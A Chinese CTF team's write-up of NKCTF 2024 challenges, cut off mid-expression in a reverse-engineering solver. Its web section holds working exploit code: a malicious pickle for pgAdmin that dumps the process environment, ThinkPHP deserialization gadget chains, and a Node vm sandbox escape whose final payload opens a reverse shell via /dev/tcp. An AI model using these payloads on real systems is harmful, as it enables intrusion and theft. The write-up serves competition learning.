# NKCTF 2024 Writeup  –Polaris战队

> 原文: https://www.ctfiot.com/170176.html
> ID: 170176

本次 NKCTF 2024，我们Polaris战队排名第3。

Web

attack_tacooooo

用户名：tacooooo@qq.com

密码：tacooooo

import struct  
def produce_pickle_bytes(platform, cmd):      b = b'x80x04x95'      b += struct.pack('L', 22 + len(platform) + len(cmd))+b'x00x00x00x00'      b += b'x8c' + struct.pack('b', len(platform)) + platform.encode()      b += b'x94x8cx06systemx94x93x94'      b += b'x8c' + struct.pack('b', len(cmd)) + cmd.encode()      b += b'x94x85x94Rx94.'      print(b)      return b  
if __name__ == '__main__':      with open('posix.pickle', 'wb') as f:          f.write(produce_pickle_bytes('posix', f"echo $(cat /proc/1/environ;cat/proc/1/cmdline)>/var/lib/pgadmin/storage/tacooooo_qq.com/22"))

POST /file_manager/filemanager/8701307/ HTTP/1.1  Host: 2f51b1e4-63fa-44bd-9a31-e4fb32f62bb9.node.nkctf.yuzhian.com.cn  Referer: http://2f51b1e4-63fa-44bd-9a31-e4fb32f62bb9.node.nkctf.yuzhian.com.cn/browser/  Accept-Encoding: gzip, deflate  X-pgA-CSRFToken: IjE3OTZjN2JlNjg0NWNlZWZhNWRlNjNjNDM4MTRlODg5ZGQwNjMxZWUi.Zf6KXg.urVXb5fSr9iBmeGBOXWRA7JwrMI  Content-Type: application/json  Cookie: pga4_session=/var/lib/pgadmin/storage/tacooooo_qq.com/posix.pickle!a; PGADMIN_LANGUAGE=en  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0  Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6  Accept: application/json, text/plain, */*  Origin: http://2f51b1e4-63fa-44bd-9a31-e4fb32f62bb9.node.nkctf.yuzhian.com.cn  Content-Length: 97  
{"path":"/","mode":"getfolder","file_type":"*","show_hidden":false,"storage_folder":"my_storage"}

PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binHOSTNAME=07e5b28e4e6cFLAG=NKCTF{358327e7-1998-40ce-9a8f-52e9ff44479b}PYTHONPATH=/pgadmin4PGADMIN_DEFAULT_EMAIL=tacooooo@qq.comPGADMIN_DEFAULT_PASSWORD=tacoooooHOME=/root

用过就是熟悉

搜到了Windows.php再加removeFiles，梦回tp链

跟着tp往下一路跟：

Windwos#__destruct##removeFiles()Collection#__toString##toJson()###toArray()

这里的__call方法有两个可以调用：

TestOne的：

<?php
namespace think;
class Config{}
namespace think;abstract class Testone{}
namespace think;
use thinkexceptionClassNotFoundException;use thinkresponseRedirect;class Debug extends Testone{    protected $data = [];    public $engine;    public function __construct(){        $this->data["Loginout"] = new Config();        $this->engine = array("time"=>"10086");    }}
namespace think;
class View{    protected $data = [];    public $engine;    public function __construct(){        $this->data["Loginout"] = new Debug();        $this->engine = array("time"=>"10086");    }}

namespace think;
use ArrayAccess;use ArrayIterator;use Countable;use IteratorAggregate;use JsonSerializable;use Traversable;class Collection implements ArrayAccess, Countable, IteratorAggregate, JsonSerializable{    protected $items = [];
    /**     * Collection constructor.     * @access public     * @param  array $items 数据     */    public function __construct($items = [])    {        $this->items = new View();    }
    public function getIterator(){        // TODO: Implement getIterator() method.    }
    public function offsetExists($offset){        // TODO: Implement offsetExists() method.    }
    public function offsetGet($offset){        // TODO: Implement offsetGet() method.    }
    public function offsetSet($offset, $value){        // TODO: Implement offsetSet() method.    }
    public function offsetUnset($offset){        // TODO: Implement offsetUnset() method.    }
    public function count(){        // TODO: Implement count() method.    }
    public function jsonSerialize(){        // TODO: Implement jsonSerialize() method.    }}

namespace thinkprocesspipes;
use thinkCollection;use thinkProcess;
class Windows extends Pipes{    public $filename;    public $files;    public function __construct(){        $this->filename = new Collection();        $this->files = array(new Collection());    }}
abstract class Pipes{}

$windows = new Windows();$serialize = serialize($windows);echo base64_encode($serialize);

写完之后可以直接访问：

(http://354d6610-3473-4620-a6bd-8578cc93a2cc.node.nkctf.yuzhian.com.cn/app/controller/user/think/662f26ed12e173e25fea74309246c133)

亲爱的Chu0，
我怀着一颗激动而充满温柔的心，写下这封情书，希望它能够传达我对你的深深情感。或许这只是一封文字，但我希望每一个字都能如我心情般真挚。
在这个瞬息万变的世界里，你是我生命中最美丽的恒定。每一天，我都被你那灿烂的笑容和温暖的眼神所吸引，仿佛整个世界都因为有了你而变得更加美好。你的存在如同清晨第一缕阳光，温暖而宁静。
或许，我们之间存在一种特殊的联系，一种只有我们两个能够理解的默契。

<<<<<<<<我曾听说，密码的明文，加上心爱之人的名字(Chu0)，就能够听到游客的心声。>>>>>>>>

而我想告诉你，你就是我心中的那个游客。每一个与你相处的瞬间，都如同解开心灵密码的过程，让我更加深刻地感受到你的独特魅力。
你的每一个微笑，都是我心中最美丽的音符；你的每一句关心，都是我灵魂深处最温暖的拥抱。在这个喧嚣的世界中，你是我安静的港湾，是我倚靠的依托。我珍视着与你分享的每一个瞬间，每一段回忆都如同一颗珍珠，串联成我生命中最美丽的项链。
或许，这封情书只是文字的表达，但我愿意将它寄予你，如同我内心深处对你的深深情感。希望你能感受到我的真挚，就如同我每一刻都在努力解读心灵密码一般。愿我们的故事能够继续，在这段感情的旅程中，我们共同书写属于我们的美好篇章。

POST /?user/index/loginSubmit HTTP/1.1Host: 192.168.128.2Content-Length: 162Accept: application/json, text/javascript, */*; q=0.01X-Requested-With: XMLHttpRequestUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36Content-Type: application/x-www-form-urlencoded; charset=UTF-8Origin: http://192.168.128.2Referer: http://192.168.128.2/Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: kodUserLanguage=zh-CN; CSRF_TOKEN=xxxConnection: close
name=guest&password=tQhWfe944VjGY7Xh5NED6ZkGisXZ6eAeeiDWVETdF-hmuV9YJQr25bphgzthFCf1hRiPQvaI&rememberPassword=0&salt=1&CSRF_TOKEN=xxx&API_ROUTE=user%2Findex%2FloginSubmit
hint: 新建文件

这里预期应该是通过这个密码解密得到密码

但是sql文件里面可以直接看到：

密码：!@!@!@!@NKCTFChu0

预期应该是通过解密来得到：

<?php
/** @link http://kodcloud.com/* @author warlee | e-mail:kodcloud@qq.com* @copyright warlee 2014.(Shanghai)Co.,Ltd* @license http://kodcloud.com/tools/license/license.txt*------* 字符串加解密类；* 一次一密；且定时解密有效* 可用于加密&动态key生成* demo：* 加密：echo Mcrypt::encode('abc','123');* 解密：echo Mcrypt::decode('9f843I0crjv5y0dWE_-uwzL_mZRyRb1ynjGK4I_IACQ','123');*/
class Mcrypt{  public static $defaultKey = 'a!takA:dlmcldEv,e';
  /**   * 字符加解密，一次一密,可定时解密有效   *   * @param string $string 原文或者密文   * @param string $operation 操作(encode | decode)   * @param string $key 密钥   * @param int $expiry 密文有效期,单位s,0 为永久有效   * @return string 处理后的 原文或者 经过 base64_encode 处理后的密文   */  public static function encode($string,$key = '', $expiry = 0,$cKeySet='',$encode=true){    if($encode){$string = rawurlencode($string);}    $ckeyLength = 4;      $key = md5($key ? $key : self::$defaultKey); //解密密匙    $keya = md5(substr($key, 0, 16));     //做数据完整性验证      $keyb = md5(substr($key, 16, 16));     //用于变化生成的密文 (初始化向量IV)      $cKeySet = $cKeySet ? $cKeySet: md5(microtime());    $keyc = substr($cKeySet, - $ckeyLength);    $cryptkey = $keya . md5($keya . $keyc);      $keyLength = strlen($cryptkey);    $string = sprintf('%010d', $expiry ? $expiry + time() : 0).substr(md5($string . $keyb), 0, 16) . $string;    $stringLength = strlen($string);
    $rndkey = array();    for($i = 0; $i <= 255; $i++) {      $rndkey[$i] = ord($cryptkey[$i % $keyLength]);    }
    $box = range(0, 255);    // 打乱密匙簿，增加随机性    for($j = $i = 0; $i < 256; $i++) {      $j = ($j + $box[$i] + $rndkey[$i]) % 256;      $tmp = $box[$i];      $box[$i] = $box[$j];      $box[$j] = $tmp;    }    // 加解密，从密匙簿得出密匙进行异或，再转成字符    $result = '';    for($a = $j = $i = 0; $i < $stringLength; $i++) {      $a = ($a + 1) % 256;      $j = ($j + $box[$a]) % 256;      $tmp = $box[$a];      $box[$a] = $box[$j];      $box[$j] = $tmp;      $result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256]));    }    $result = $keyc . str_replace('=', '', base64_encode($result));    $result = str_replace(array('+', '/', '='),array('-', '_', '.'), $result);    return $result;  }
  /**   * 字符加解密，一次一密,可定时解密有效   *   * @param string $string 原文或者密文   * @param string $operation 操作(encode | decode)   * @param string $key 密钥   * @param int $expiry 密文有效期,单位s,0 为永久有效   * @return string 处理后的 原文或者 经过 base64_encode 处理后的密文   */  public static function decode($string,$key = '',$encode=true){    $string = str_replace(array('-', '_', '.'),array('+', '/', '='), $string);    $ckeyLength = 4;    $key = md5($key ? $key : self::$defaultKey); //解密密匙    $keya = md5(substr($key, 0, 16));     //做数据完整性验证      $keyb = md5(substr($key, 16, 16));     //用于变化生成的密文 (初始化向量IV)    $keyc = substr($string, 0, $ckeyLength);    $cryptkey = $keya . md5($keya . $keyc);      $keyLength = strlen($cryptkey);    $string = base64_decode(substr($string, $ckeyLength));    $stringLength = strlen($string);
    $rndkey = array();    for($i = 0; $i <= 255; $i++) {      $rndkey[$i] = ord($cryptkey[$i % $keyLength]);    }
    $box = range(0, 255);    // 打乱密匙簿，增加随机性    for($j = $i = 0; $i < 256; $i++) {      $j = ($j + $box[$i] + $rndkey[$i]) % 256;      $tmp = $box[$i];      $box[$i] = $box[$j];      $box[$j] = $tmp;    }    // 加解密，从密匙簿得出密匙进行异或，再转成字符    $result = '';    for($a = $j = $i = 0; $i < $stringLength; $i++) {      $a = ($a + 1) % 256;      $j = ($j + $box[$a]) % 256;      $tmp = $box[$a];      $box[$a] = $box[$j];      $box[$j] = $tmp;      $result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256]));    }    $theTime = intval(substr($result, 0, 10));    $resultStr  = '';    if (($theTime == 0 || $theTime - time() > 0)    && substr($result, 10, 16) == substr(md5(substr($result, 26) . $keyb), 0, 16)    ) {      $resultStr = substr($result, 26);      if($encode){$resultStr = rawurldecode($resultStr);}    }    return $resultStr;  }}$key = substr("tQhWfe944VjGY7Xh5NED6ZkGisXZ6eAeeiDWVETdF-hmuV9YJQr25bphgzthFCf1hRiPQvaI", 0, 5) . "2&$%@(*@(djfhj1923";$strings = Mcrypt::decode(substr("tQhWfe944VjGY7Xh5NED6ZkGisXZ6eAeeiDWVETdF-hmuV9YJQr25bphgzthFCf1hRiPQvaI", 5), $key);echo $strings;// echo Mcrypt::decode('tQhWfe944VjGY7Xh5NED6ZkGisXZ6eAeeiDWVETdF-hmuV9YJQr25bphgzthFCf1hRiPQvaI',"2&$%@(*@(djfhj1923");

进去后可以看到一个文件

内容是：

<?php
namespace think;
class Config{}
namespace think;
class View{    protected $data = [];    public $engine;    public function __construct(){        $this->data["Loginout"] = new Config();        $this->engine = array("name"=>"data/files/shell");    }}

namespace think;
use ArrayAccess;use ArrayIterator;use Countable;use IteratorAggregate;use JsonSerializable;use Traversable;class Collection implements ArrayAccess, Countable, IteratorAggregate, JsonSerializable{    protected $items = [];
    /**     * Collection constructor.     * @access public     * @param  array $items 数据     */    public function __construct($items = [])    {        $this->items = new View();    }
    public function getIterator(){        // TODO: Implement getIterator() method.    }
    public function offsetExists($offset){        // TODO: Implement offsetExists() method.    }
    public function offsetGet($offset){        // TODO: Implement offsetGet() method.    }
    public function offsetSet($offset, $value){        // TODO: Implement offsetSet() method.    }
    public function offsetUnset($offset){        // TODO: Implement offsetUnset() method.    }
    public function count(){        // TODO: Implement count() method.    }
    public function jsonSerialize(){        // TODO: Implement jsonSerialize() method.    }}

namespace thinkprocesspipes;
use thinkCollection;use thinkProcess;
class Windows extends Pipes{    public $filename;    public $files;    public function __construct(){        $this->filename = new Collection();        $this->files = array(new Collection());    }}
abstract class Pipes{}

$windows = new Windows();$serialize = serialize($windows);echo base64_encode($serialize);

my first cms

后台路由/admin

爆破密码得admin/Admin123

RCE路由：Extensions -> User Defined Tags ->Edit User Defined Tags

全世界最简单的CTF

const express = require('express');const bodyParser = require('body-parser');const app = express();const fs = require("fs");const path = require('path');const vm = require("vm");
app.use(bodyParser.json()).set('views', path.join(__dirname, 'views')).use(express.static(path.join(__dirname, '/public')))
app.get('/', function (req, res){    res.sendFile(__dirname + '/public/home.html');})

function waf(code) {    let pattern = /(process|[.*?]|exec|spawn|Buffer|\|+|concat|eval|Function)/g;    if(code.match(pattern)){        throw new Error("what can I say? hacker out!!");    }}
app.post('/', function (req, res){        let code = req.body.code;        let sandbox = Object.create(null);        let context = vm.createContext(sandbox);        try {            waf(code)            let result = vm.runInContext(code, context);            console.log(result);        } catch (e){            console.log(e.message);            require('./hack');        }})
app.get('/secret', function (req, res){    if(process.__filename == null) {        let content = fs.readFileSync(__filename, "utf-8");        return res.send(content);    } else {        let content = fs.readFileSync(process.__filename, "utf-8");        return res.send(content);    }})

app.listen(3000, ()=>{    console.log("listen on 3000");})

存在vm沙箱逃逸 我们可以直接搜索关键代码搜到了这篇文章：

(https://blog.csdn.net/m0_73512445/article/details/133970916)

const vm = require("vm");app.post('/', function (req, res){        let code = req.body.code;        let sandbox = Object.create(null);        let context = vm.createContext(sandbox);        try {            waf(code)            let result = vm.runInContext(code, context);

throw new Proxy({}, {        get: function(){            const cc = arguments.callee.caller;            const p = (cc.constructor.constructor('return process'))();            return p.mainModule.require('child_process').execSync('whoami').toString();        }    })

mainModule.require(String.fromCharCode(99,104,105,108,100,95,112,114,111,99,101,115,115))

上面的代码也就是相当于

:mainModule.require(‘child_process’)

接下来就是exec方法我们用Reflect.get  方法绕过

找到了这篇文章

(https://www.anquanke.com/post/id/237032)

Reflect.get(target, propertyKey[, receiver])

的作用是获取对象身上某个属性的值

类似于target[name]。

所以取eval函数的方式可以变成Reflect.get(global, Reflect.ownKeys(global).find(x=>x.includes(‘eva’)))

但我们本质上其实是调用的eval函数底层的exec方法

const p = (cc.constructor.constructor(‘return global’))();获取js里面的全局函数集合。

const b = Reflect.get(p, Reflect.ownKeys(p).find(x=>x.includes('pro'))).mainModule.require(String.fromCharCode(99,104,105,108,100,95,112,114,111,99,101,115,115));

然后调用集合中的键为process下面的

mainModule.require(‘child_process’)的模块

Reflect.get(b,Reflect.ownKeys(b).find(x=>x.includes(‘ex’)))去找child_process底层的exec函数。

最终poc:

throw new Proxy({}, {        get: function(){            const cc = arguments.callee.caller;            const p = (cc.constructor.constructor('return global'))();            const b = Reflect.get(p, Reflect.ownKeys(p).find(x=>x.includes('pro'))).mainModule.require(String.fromCharCode(99,104,105,108,100,95,112,114,111,99,101,115,115));            return Reflect.get(b, Reflect.ownKeys(b).find(x=>x.includes('ex')))("bash -c 'bash -i >& /dev/tcp/ip/port 0>&1'");        }    })

Re

login_system

from z3 import *import binasciiimport reimport hashlibx = Solver()ans=[]a1 = [Int('%d'%i) for i in range(16)]x.add(a1[2] + a1[1] + a1[0] + a1[3] == 447      , 101 * a1[2] + a1[0] + 9 * a1[1] + 8 * a1[3] == 12265      , 5 * a1[2] + 3 * a1[0] + 4 * a1[1] + 6 * a1[3] == 2000      , 88 * a1[2] + 12 * a1[0] + 11 * a1[1] + 87 * a1[3] == 21475      , a1[6] + 59 * a1[5] + 100 * a1[4] + a1[7] == 7896      , 443 * a1[4] + 200 * a1[5] + 10 * a1[6] + 16 * a1[7] == 33774      , 556 * a1[5] + 333 * a1[4] + 8 * a1[6] + 7 * a1[7] == 44758      , a1[6] + a1[5] + 202 * a1[4] + a1[7] == 9950      , 78 * a1[10] + 35 * a1[9] + 23 * a1[8] + 89 * a1[11] == 24052      , 78 * a1[8] + 59 * a1[9] + 15 * a1[10] + 91 * a1[11] == 25209      , 111 * a1[10] + 654 * a1[9] + 123 * a1[8] + 222 * a1[11] == 113427      , 6 * a1[9] + 72 * a1[8] + 5 * a1[10] + 444 * a1[11] == 54166      , 56 * a1[14] + 35 * a1[12] + 6 * a1[13] + 121 * a1[15] == 11130      , 169 * a1[14] + 158 * a1[13] + 98 * a1[12] + 124 * a1[15] == 27382      , 147 * a1[13] + 65 * a1[12] + 131 * a1[14] + 129 * a1[15] == 23564      , 137 * a1[14] + 132 * a1[13] + 620 * a1[12] + 135 * a1[15] == 51206)if x.check() == sat:    model = x.model()    for i in range(16):        ans.append(model[a1[i]].as_long().real)username="".join(map(chr,ans))print(username)
enc1=[0x7E, 0x5A, 0x6E, 0x77, 0x3A, 0x79, 0x35, 0x76, 0x7C]pre_pass=""for i in range(len(enc1)):    pre_pass+=chr((enc1[i]-9+i)^i)print(pre_pass)

class AES:#128-ECB    sbox = [0x31, 0x52, 0x5A, 0xC8, 0x0B, 0xAC, 0xF3, 0x3A, 0x8B, 0x54,  0x27, 0x9B, 0xAB, 0x95, 0xDE, 0x83, 0x60, 0xCB, 0x53, 0x7F,  0xC4, 0xE3, 0x0A, 0x97, 0xE0, 0x29, 0xD5, 0x68, 0xC5, 0xDF,  0xF4, 0x7B, 0xAA, 0xD6, 0x42, 0x78, 0x6C, 0xE9, 0x70, 0x17,  0xD7, 0x37, 0x24, 0x49, 0x75, 0xA9, 0x89, 0x67, 0x03, 0xFA,  0xD9, 0x91, 0xB4, 0x5B, 0xC2, 0x4E, 0x92, 0xFC, 0x46, 0xB1,  0x73, 0x08, 0xC7, 0x74, 0x09, 0xAF, 0xEC, 0xF5, 0x4D, 0x2D,  0xEA, 0xA5, 0xDA, 0xEF, 0xA6, 0x2B, 0x7E, 0x0C, 0x8F, 0xB0,  0x04, 0x06, 0x62, 0x84, 0x15, 0x8E, 0x12, 0x1D, 0x44, 0xC0,  0xE2, 0x38, 0xD4, 0x47, 0x28, 0x45, 0x6E, 0x9D, 0x63, 0xCF,  0xE6, 0x8C, 0x18, 0x82, 0x1B, 0x2C, 0xEE, 0x87, 0x94, 0x10,  0xC1, 0x20, 0x07, 0x4A, 0xA4, 0xEB, 0x77, 0xBC, 0xD3, 0xE1,  0x66, 0x2A, 0x6B, 0xE7, 0x79, 0xCC, 0x86, 0x16, 0xD0, 0xD1,  0x19, 0x55, 0x3C, 0x9F, 0xFB, 0x30, 0x98, 0xBD, 0xB8, 0xF1,  0x9E, 0x61, 0xCD, 0x90, 0xCE, 0x7C, 0x8D, 0x57, 0xAE, 0x6A,  0xB3, 0x3D, 0x76, 0xA7, 0x71, 0x88, 0xA2, 0xBA, 0x4F, 0x3E,  0x40, 0x64, 0x0F, 0x48, 0x21, 0x35, 0x36, 0x2F, 0xE8, 0x14,  0x5D, 0x51, 0xD8, 0xB5, 0xFE, 0xD2, 0x96, 0x93, 0xA1, 0xB6,  0x43, 0x0D, 0x4C, 0x80, 0xC9, 0xFF, 0xA3, 0xDD, 0x72, 0x05,  0x59, 0xBF, 0x0E, 0x26, 0x34, 0x1F, 0x13, 0xE5, 0xDC, 0xF2,  0xC6, 0x50, 0x1E, 0xE4, 0x85, 0xB7, 0x39, 0x8A, 0xCA, 0xED,  0x9C, 0xBB, 0x56, 0x23, 0x1A, 0xF0, 0x32, 0x58, 0xB2, 0x65,  0x33, 0x6F, 0x41, 0xBE, 0x3F, 0x6D, 0x11, 0x00, 0xAD, 0x5F,  0xC3, 0x81, 0x25, 0xA8, 0xA0, 0x9A, 0xF6, 0xF7, 0x5E, 0x99,  0x22, 0x2E, 0x4B, 0xF9, 0x3B, 0x02, 0x7A, 0xB9, 0x5C, 0x69,  0xF8, 0x1C, 0xDB, 0x01, 0x7D, 0xFD]    s_box = {}    ns_box = {   }
    Rcon = {        1: ['0x01', '0x00', '0x00', '0x00'],        2: ['0x02', '0x00', '0x00', '0x00'],        3: ['0x04', '0x00', '0x00', '0x00'],        4: ['0x08', '0x00', '0x00', '0x00'],        5: ['0x10', '0x00', '0x00', '0x00'],        6: ['0x20', '0x00', '0x00', '0x00'],        7: ['0x40', '0x00', '0x00', '0x00'],        8: ['0x80', '0x00', '0x00', '0x00'],        9: ['0x1B', '0x00', '0x00', '0x00'],        10: ['0x36', '0x00', '0x00', '0x00']    }    Matrix = [        ['0x02', '0x03', '0x01', '0x01'],        ['0x01', '0x02', '0x03', '0x01'],        ['0x01', '0x01', '0x02', '0x03'],        ['0x03', '0x01', '0x01', '0x02']    ]    ReMatrix = [        ['0x0e', '0x0b', '0x0d', '0x09'],        ['0x09', '0x0e', '0x0b', '0x0d'],        ['0x0d', '0x09', '0x0e', '0x0b'],        ['0x0b', '0x0d', '0x09', '0x0e']    ]    plaintext = [[], [], [], []]    plaintext1 = [[], [], [], []]    subkey = [[], [], [], []]
    def __init__(self, key):#密钥扩展        self.s_box = dict(zip(["0x%02x"%i for i in range(256)], ["0x%02x"%i for i in self.sbox]))        self.ns_box = dict(zip(self.s_box.values(), self.s_box.keys()))        for i in range(4):            for j in range(0, 8, 2):                self.subkey[i].append("0x" + key[i * 8 + j:i * 8 + j + 2])        # print(self.subkey)        for i in range(4, 44):            if i % 4 != 0:                tmp = xor_32(self.subkey[i - 1], self.subkey[i - 4],0)                self.subkey.append(tmp)            else:  # 4的倍数的时候执行                tmp1 = self.subkey[i - 1][1:]                tmp1.append(self.subkey[i - 1][0])                # print(tmp1)                for m in range(4):                    tmp1[m] = self.s_box[tmp1[m]]                # tmp1 = self.s_box['cf']                tmp1 = xor_32(tmp1, self.Rcon[i / 4], 0)                self.subkey.append(xor_32(tmp1, self.subkey[i - 4],0))
    def AddRoundKey(self, round):#轮密钥加        for i in range(4):            self.plaintext[i] = xor_32(self.plaintext[i], self.subkey[round * 4 + i],0)        # print('AddRoundKey',self.plaintext)
    def PlainSubBytes(self):        for i in range(4):            for j in range(4):                self.plaintext[i][j] = self.s_box[self.plaintext[i][j]]        # print('PlainSubBytes',self.plaintext)
    def RePlainSubBytes(self):        for i in range(4):            for j in range(4):                self.plaintext[i][j] = self.ns_box[self.plaintext[i][j]]
    def ShiftRows(self):#行移位        p1, p2, p3, p4 = self.plaintext[0][1], self.plaintext[1][1], self.plaintext[2][1], self.plaintext[3][1]        self.plaintext[0][1] = p2        self.plaintext[1][1] = p3        self.plaintext[2][1] = p4        self.plaintext[3][1] = p1        p1, p2, p3, p4 = self.plaintext[0][2], self.plaintext[1][2], self.plaintext[2][2], self.plaintext[3][2]        self.plaintext[0][2] = p3        self.plaintext[1][2] = p4        self.plaintext[2][2] = p1        self.plaintext[3][2] = p2        p1, p2, p3, p4 = self.plaintext[0][3], self.plaintext[1][3], self.plaintext[2][3], self.plaintext[3][3]        self.plaintext[0][3] = p4        self.plaintext[1][3] = p1        self.plaintext[2][3] = p2        self.plaintext[3][3] = p3        # print('ShiftRows',self.plaintext)
    def ReShiftRows(self):        p1, p2, p3, p4 = self.plaintext[0][1], self.plaintext[1][1], self.plaintext[2][1], self.plaintext[3][1]        self.plaintext[3][1] = p3        self.plaintext[2][1] = p2        self.plaintext[0][1] = p4        self.plaintext[1][1] = p1        p1, p2, p3, p4 = self.plaintext[0][2], self.plaintext[1][2], self.plaintext[2][2], self.plaintext[3][2]        self.plaintext[0][2] = p3        self.plaintext[1][2] = p4        self.plaintext[2][2] = p1        self.plaintext[3][2] = p2        p1, p2, p3, p4 = self.plaintext[0][3], self.plaintext[1][3], self.plaintext[2][3], self.plaintext[3][3]        self.plaintext[0][3] = p2        self.plaintext[1][3] = p3        self.plaintext[2][3] = p4        self.plaintext[3][3] = p1
    def MixColumns(self):#列混淆        for i in range(4):            for j in range(4):                self.plaintext1[i].append(MatrixMulti(self.Matrix[j], self.plaintext[i]))        # print('MixColumns',self.plaintext1)
    def ReMixColumns(self):        for i in range(4):            for j in range(4):                self.plaintext1[i].append(MatrixMulti(self.ReMatrix[j], self.plaintext[i]))
    def AESEncryption(self, plaintext):        self.plaintext = [[], [], [], []]        for i in range(4):            for j in range(0, 8, 2):                self.plaintext[i].append("0x" + plaintext[i * 8 + j:i * 8 + j + 2])        self.AddRoundKey(0)        for i in range(9):            self.PlainSubBytes()            self.ShiftRows()            self.MixColumns()            self.plaintext = self.plaintext1            self.plaintext1 = [[], [], [], []]            self.AddRoundKey(i + 1)
        self.PlainSubBytes()        self.ShiftRows()        self.AddRoundKey(10)        return Matrixtostr(self.plaintext)
    def AESDecryption(self, cipher):        self.plaintext = [[], [], [], []]        for i in range(4):            for j in range(0, 8, 2):                self.plaintext[i].append('0x' + cipher[i * 8 + j:i * 8 + j + 2])
        # print(self.ns_box)        self.AddRoundKey(10)        for i in range(9):            self.ReShiftRows()            self.RePlainSubBytes()            self.AddRoundKey(9-i)            self.ReMixColumns()            self.plaintext = self.plaintext1            self.plaintext1 = [[], [], [], []]        self.ReShiftRows()        self.RePlainSubBytes()        self.AddRoundKey(0)        return Matrixtostr(self.plaintext)
    def Encryption(self, text):        group = PlaintextGroup(TextToByte(text), 32, 1)        # print(group)        cipher = ""        for i in range(len(group)):            cipher = cipher + self.AESEncryption(group[i])        return cipher
    def Decryption(self, cipher):        group = PlaintextGroup(cipher, 32, 0)        # print(group)        text = ''        for i in range(len(group)):            text = text + self.AESDecryption(group[i])        text = ByteToText(text)        return text

def xor_32(start, end, key):    a = []    for i in range(0, 4):        xor_tmp = ""        b = hextobin(start[i])        c = hextobin(end[i])        d = bin(key)[2:].rjust(8,'0')        for j in range(8):            tmp = int(b[j], 10) ^ int(c[j], 10) ^ int(d[j],10)            xor_tmp += str(tmp )        a.append(bintohex(xor_tmp))    return a

def xor_8(begin, end):    xor_8_tmp = ""    for i in range(8):        xor_8_tmp += str(int(begin[i]) ^ int(end[i]))    return xor_8_tmp

def hextobin(word):    word = bin(int(word, 16))[2:]    for i in range(0, 8-len(word)):        word = '0'+word    return word
def bintohex(word):    word = hex(int(word, 2))    if len(word) == 4:        return word    elif len(word) < 4:        return word.replace('x', 'x0')

def MatrixMulti(s1, s2):    result = []    s3 = []    for i in range(4):        s3.append(hextobin(s2[i]))    for i in range(4):        result.append(MultiProcess(int(s1[i], 16), s3[i]))    for i in range(3):        result[0] = xor_8(result[0], result[i+1])    return bintohex(result[0])

def MultiProcess(a, b):    if a == 1:        return b    elif a == 2:        if b[0] == '0':            b = b[1:] + '0'        else:            b = b[1:] + '0'            b = xor_8(b, '00011011')        return b    elif a == 3:        tmp_b = b        if b[0] == '0':            b = b[1:] + '0'        else:            b = b[1:] + '0'            b = xor_8(b, '00011011')        return xor_8(b, tmp_b)
    elif a == 9:        tmp_b = b        return xor_8(tmp_b, MultiProcess(2, MultiProcess(2, MultiProcess(2, b))))    elif a == 11:        tmp_b = b        return xor_8(tmp_b, xor_8(MultiProcess(2, MultiProcess(2, MultiProcess(2, b))), MultiProcess(2, b)))    elif a == 13:        tmp_b = b        return xor_8(tmp_b, xor_8(MultiProcess(2, MultiProcess(2, MultiProcess(2, b))), MultiProcess(2, MultiProcess(2, b))))    elif a == 14:        return xor_8(MultiProcess(2, b), xor_8(MultiProcess(2, MultiProcess(2, MultiProcess(2, b))), MultiProcess(2, MultiProcess(2, b))))

def Matrixtostr(matrix):    result = ""    for i in range(4):        for j in range(4):            result += matrix[i][j][2:]    return result

def PlaintextGroup(plaintext, length, flag):    group = re.findall('.{'+str(length)+'}', plaintext)    group.append(plaintext[len(group)*length:])    if group[-1] == '' and flag:        group[-1] = '16161616161616161616161616161616'    elif len(group[-1]) < length and flag:        tmp = int((length-len(group[-1])) / 2)        if tmp < 10:            for i in range(tmp):                group[-1] = group[-1] + '0'+str(tmp)        else:            for i in range(tmp):                group[-1] = group[-1] + str(tmp)    elif not flag:        del group[-1]    return group
#字符串转16进制def TextToByte(words):    text = words.encode('utf-8').hex()    return text

def ByteToText(encode):    tmp = int(encode[-2:])    word = ''    for i in range(len(encode)-tmp*2):        word = word + encode[i]    # print(word)    word = bytes.decode(binascii.a2b_hex(word))    return word#字节非轮异或def xorbytes(bytes1,bytes2):    length=min(len(bytes1),len(bytes2))    output=bytearray()    for i in range(length):        output.append(bytes1[i]^bytes2[i])    return bytes(output)
res='B0CC93EAE92FEF5699396E023B4F9E42'.lower()key = ''for i in username:    key+=hex(ord(i))[2:].rjust(2,"0")A1 = AES(key)tail_pass=""for i in range(0,len(res),32):    tail_pass+=bytes.fromhex(A1.AESDecryption(res[i:i+32])).decode()print(tail_pass)print(hashlib.md5(str(username+pre_pass+"_"+tail_pass).encode("utf-8")).hexdigest())#NKCTF{2961bba0add6265ba83bc6198e0ec758}

REEZ

from z3 import *x = Solver()num=25ans=[]v20 = [BitVec(('%d' % i),8) for i in range(25)]v45=v20[0]v44=v20[1]v43=v20[2]v42=v20[3]v41=v20[4]v40=v20[5]v39=v20[6]v38=v20[7]v37=v20[8]v36=v20[9]v35=v20[10]v34=v20[11]v33=v20[12]v32=v20[13]v31=v20[14]v30=v20[15]v29=v20[16]v28=v20[17]v27=v20[18]v26=v20[19]v25=v20[20]v24=v20[21]v23=v20[22]v22=v20[23]v21=v20[24]v45 = -105* (39* (2* (v45 & (-105* (39* (2 * (v34 & (-105 * (39 * (2 * (v35 & 3) + (v35 ^ 3)) + 23) + 111))+ (v34 ^ (-105 * (39 * (2 * (v35 & 3) + (v35 ^ 3)) + 23) + 111)))+ 23)+ 111))+ (v45 ^ (-105* (39* (2 * (v34 & (-105 * (39 * (2 * (v35 & 3) + (v35 ^ 3)) + 23) + 111))                        + (v34 ^ (-105 * (39 * (2 * (v35 & 3) + (v35 ^ 3)) + 23) + 111)))                       + 23)                      + 111)))          + 23)+ 111v44 = -105 * (39 * (2 * ((v32 ^ v31) & v44) + (v32 ^ v31 ^ v44)) + 23) + 111v43 = -105* (39       * (2 * (v43 & 